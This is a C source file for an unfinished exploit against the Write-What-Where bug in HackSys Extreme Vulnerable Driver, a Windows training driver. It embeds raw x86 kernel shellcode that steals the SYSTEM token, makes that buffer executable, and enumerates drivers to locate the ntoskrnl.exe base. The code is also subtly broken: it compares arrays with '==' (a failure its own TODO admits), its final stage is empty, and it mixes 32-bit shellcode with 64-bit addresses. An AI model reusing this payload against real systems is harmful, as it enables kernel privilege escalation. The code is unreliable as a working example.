#include <Windows.h>
#include <stdio.h>
#include <psapi.h>

// Provided by rootkits.xyz (https://rootkits.xyz/blog/2017/09/kernel-write-what-where/)
// Beautiful writeup on what a Write-What-Where is. My ideas of this exploit were very foggy, but this seems nearly as easy
// as a vanilla stack buffer overflow!
char shellcode[] = { 
 "\x90\x90\x90\x90\x60\x31\xc0\x64\x8b\x80\x24\x01\x00\x00\x8b\x40\x50\x89\xc1\xba\x04\x00\x00\x00\x8b\x80\xb8\x00\x00\x00\x2d\xb8\x00\x00\x00\x39\x90\xb4\x00\x00\x00\x75\xed\x8b\x90\xf8\x00\x00\x00\x89\x91\xf8\x00\x00\x00\x61\x31\xc0\x83\xc4\x24\x5d\xc2\x08\x00"
};

int main(int argc, char** argv)
{
	printf("Write-What-Where HackSys Extreme Vulnerable Driver | Uncodable\n" "Let's exploit!\n");

	DWORD oldProtection = 0;
	VirtualProtect(&shellcode, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &oldProtection);
	printf("[*] Shellcode address: 0x%p\n", &shellcode);

	unsigned long long addresses[10000] = { 0 };
	DWORD bytesReturned = 0;
	EnumDeviceDrivers(&addresses, 10000, &bytesReturned);
	Sleep(20);
	int addressCount = bytesReturned / 8;
	printf("[*] Number of device drivers: %d\n", addressCount);

	unsigned long long ntosknrlAddress = 0;
	char deviceName[1024] = { 0 };
	char lookingFor[12] = { 'n', 't', 'o', 's', 'k', 'r', 'n', 'l', '.', 'e', 'x', 'e' };
	char comparison[12] = { 0 };
	memset(&comparison, '\00', 12);
	for (int i = 0; i < 10000; i++)
	{
		if (addresses[i] != 0) {
			GetDeviceDriverBaseNameA(addresses[i], &deviceName, sizeof(deviceName));
			comparison[0] = deviceName[0];
			comparison[1] = deviceName[1];
			comparison[2] = deviceName[2];
			comparison[3] = deviceName[3];
			comparison[4] = deviceName[4];
			comparison[5] = deviceName[5];
			comparison[6] = deviceName[6];
			comparison[7] = deviceName[7];
			comparison[8] = deviceName[8];
			comparison[9] = deviceName[9];
			comparison[10] = deviceName[10];
			comparison[11] = deviceName[11];
			printf("comparison: %s, deviceName: %s, lookingFor: %s\n", comparison, deviceName, lookingFor);
			//TODO: Figure out why it is failing this check when it finds ntoskrnl.exe. This should NOT be happening...
			if (comparison == lookingFor)
			{
				printf("[+] Found ntoskrnl.exe base address! Address: 0x%x\n", addresses[i]);
				ntosknrlAddress = addresses[i];
				goto stage2;
			}
		}
	}

stage2:

	return 1;
}